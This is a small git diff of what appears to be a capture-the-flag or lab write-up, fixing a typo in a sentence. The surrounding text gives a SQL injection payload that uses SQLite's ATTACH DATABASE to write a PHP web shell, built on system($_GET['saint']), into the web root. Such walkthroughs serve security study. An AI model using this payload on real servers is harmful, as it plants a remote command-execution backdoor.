@@ -83,7 +83,7 @@ Once we provide the cookie and go to `saint.php` we notice `www-data`.
 
 <img src="images/image18.png" width="500">
 
-Now lets go for a web shell by adding `system($_GET['saint'])`. Note that the table and column has already been creating. If we try the same injection we will get an error from SQLite. So our next injection will look something like this: 
+Now lets go for a web shell by adding `system($_GET['saint'])`. Note that the table and column has already been created. If we try the same injection we will get an error from SQLite. So our next injection will look something like this: 
 
 `'); ATTACH DATABASE '/var/www/html/saint.php' AS saint; INSERT INTO saint.barber (data) VALUES ('<?php echo \"<pre>\"; system(\$_GET[\"saint\"]);?>');-- -`
 
